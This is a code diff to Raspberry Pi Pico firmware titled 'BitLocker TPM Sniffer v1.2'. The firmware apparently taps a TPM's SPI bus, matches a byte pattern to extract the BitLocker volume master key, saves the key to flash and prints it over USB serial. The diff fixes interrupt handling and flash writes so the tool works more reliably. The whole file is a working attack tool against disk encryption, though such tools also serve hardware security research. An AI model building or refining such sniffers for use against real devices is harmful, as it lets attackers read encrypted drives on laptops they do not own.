@@ -4,6 +4,7 @@
 #include "pico/flash.h"
 #include "hardware/gpio.h"
 #include "hardware/irq.h"
+#include "hardware/sync.h"
 #include "flash_storage.h"
 
 // Hardware Configuration
@@ -33,7 +34,6 @@ static bool win_full = false;
 
 // Live Stream Buffer
 #define STREAM_BUFFER_SIZE 512
-// Use uint16_t to store direction flag in the top bit
 static volatile uint16_t stream_buffer[STREAM_BUFFER_SIZE];
 static volatile int stream_head = 0;
 static volatile int stream_tail = 0;
@@ -42,10 +42,51 @@ static volatile bool stream_active = false;
 // Statistics
 static volatile uint32_t transactions_processed = 0;
 static volatile uint32_t keys_found = 0;
-static volatile bool key_found_flag = false;
 
+// Buffer for safely moving keys from ISR to Main Loop
+static volatile bool key_save_pending = false;
+static uint8_t pending_key[32];
+
+// Fn Defs
+void processSPIByte(uint8_t mosi, uint8_t miso);
 bool checkAndStoreKey();
+void processCommand(const char* cmd);
 
+// --- Unified GPIO IRQ Dispatcher ---
+// Handles both CS and SCK events to ensure both are captured correctly.
+volatile uint8_t mosi_shift = 0;
+volatile uint8_t miso_shift = 0;
+volatile uint8_t bit_cnt = 0;
+volatile bool active = false;
+
+void gpio_irq_dispatcher(uint gpio, uint32_t events) {
+    // Handle Chip Select (CS) events
+    if (gpio == PIN_SPI0_CS) {
+        if (events & GPIO_IRQ_EDGE_FALL) {
+            active = true;
+            bit_cnt = 0;
+            mosi_shift = 0;
+            miso_shift = 0;
+        } else if (events & GPIO_IRQ_EDGE_RISE) {
+            active = false;
+        }
+    }
+    // Handle SPI Clock (SCK) events
+    else if (gpio == PIN_SPI0_SCK) {
+        // Only process on rising edge if CS is active (low)
+        if (!active || !(events & GPIO_IRQ_EDGE_RISE)) return;
+
+        mosi_shift = (mosi_shift << 1) | gpio_get(PIN_SPI0_MOSI);
+        miso_shift = (miso_shift << 1) | gpio_get(PIN_SPI0_MISO);
+
+        if (++bit_cnt >= 8) {
+            processSPIByte(mosi_shift, miso_shift);
+            bit_cnt = 0;
+            mosi_shift = 0;
+            miso_shift = 0;
+        }
+    }
+}
 
 // This is called from interrupt context - must be fast!
 void processSPIByte(uint8_t mosi, uint8_t miso) {
@@ -105,7 +146,6 @@ void processSPIByte(uint8_t mosi, uint8_t miso) {
                     // Check for key pattern
                     if (checkAndStoreKey()) {
                         keys_found++;
-                        key_found_flag = true;
                     }
                 }
                 state = 0; // Reset
@@ -114,7 +154,7 @@ void processSPIByte(uint8_t mosi, uint8_t miso) {
     }
 }
 
-// --- Key Pattern Matcher & Flash Storage ---
+// --- Key Pattern Matcher ---
 // 44-byte pattern: 2c 00 0V 00 0I 00 0A 00 0B 20 00 00 [32 key bytes]
 bool checkAndStoreKey() {
     int max_pos = win_full ? 44 : win_pos;
@@ -142,43 +182,13 @@ bool checkAndStoreKey() {
                 key[j] = window[(idx + 12 + j) % 44];
             }
 
-            // Write to flash with atomic replace
-            flash_store_key(key);
+            // Copy to global buffer and set flag for main loop.
+            memcpy(pending_key, key, 32);
+            key_save_pending = true;
             return true;
         }
     }
     return false;
-}
-
-// --- SPI GPIO Interrupt Handlers ---
-volatile uint8_t mosi_shift = 0;
-volatile uint8_t miso_shift = 0;
-volatile uint8_t bit_cnt = 0;
-volatile bool active = false;
-
-void cs_irq(uint gpio, uint32_t events) {
-    if (events & GPIO_IRQ_EDGE_FALL) {
-        active = true;
-        bit_cnt = 0;
-        mosi_shift = 0;
-        miso_shift = 0;
-    } else {
-        active = false;
-    }
-}
-
-void sck_irq(uint gpio, uint32_t events) {
-    if (!active || !(events & GPIO_IRQ_EDGE_RISE)) return;
-
-    mosi_shift = (mosi_shift << 1) | gpio_get(PIN_SPI0_MOSI);
-    miso_shift = (miso_shift << 1) | gpio_get(PIN_SPI0_MISO);
-
-    if (++bit_cnt >= 8) {
-        processSPIByte(mosi_shift, miso_shift);
-        bit_cnt = 0;
-        mosi_shift = 0;
-        miso_shift = 0;
-    }
 }
 
 // --- USB Serial Command Processor ---
@@ -232,7 +242,7 @@ int main() {
     while (!stdio_usb_connected()) {
         sleep_ms(100);
     }
-    printf("\n=== BitLocker TPM Sniffer v1.1 ===\n");
+    printf("\n=== BitLocker TPM Sniffer v1.2 ===\n");
 
     uint8_t boot_key[32];
     if (flash_retrieve_key(boot_key)) {
@@ -259,17 +269,17 @@ int main() {
     gpio_init(PIN_SPI0_MISO);
     gpio_set_dir(PIN_SPI0_MISO, GPIO_IN);
 
-    // Enable interrupts
+    // We set a global callback that handles both CS and SCK pins.
     gpio_set_irq_enabled_with_callback(PIN_SPI0_CS,
         GPIO_IRQ_EDGE_FALL | GPIO_IRQ_EDGE_RISE,
         true,
-        cs_irq);
+        gpio_irq_dispatcher);
 
     gpio_set_irq_enabled(PIN_SPI0_SCK,
         GPIO_IRQ_EDGE_RISE,
         true);
 
-    // Main loop: process USB commands and Drain Stream Buffer
+    // Main loop
     while (true) {
         int c = getchar_timeout_us(0);
         if (c != PICO_ERROR_TIMEOUT) {
@@ -283,10 +293,19 @@ int main() {
             }
         }
 
-        if (key_found_flag) {
+        // Handle Flash Writing safely outside of ISR
+        if (key_save_pending) {
+            uint8_t local_key[32];
+            memcpy(local_key, pending_key, 32);
+
+            // Disable interrupts for the duration of the flash write
+            uint32_t ints = save_and_disable_interrupts();
+            flash_store_key(local_key);
+            restore_interrupts(ints);
+
             printf("\n[[[ !!! KEY FOUND !!! ]]]\n");
             printf("Stored to Flash. Use 'getkey' to view.\n");
-            key_found_flag = false; // Reset flag so we don't spam
+            key_save_pending = false;
         }
 
         // --- Drain Stream Buffer to Console ---
@@ -296,7 +315,6 @@ int main() {
                 uint16_t entry = stream_buffer[stream_tail];
                 uint8_t val = entry & 0xFF;
 
-                // Check direction flag (0x8000)
                 if (entry & 0x8000) {
                     printf("[R]%02X ", val);
                 } else {
@@ -308,7 +326,6 @@ int main() {
             printf("\n");
         }
 
-        // Brief sleep to let IRQs run
         sleep_ms(10);
     }
 
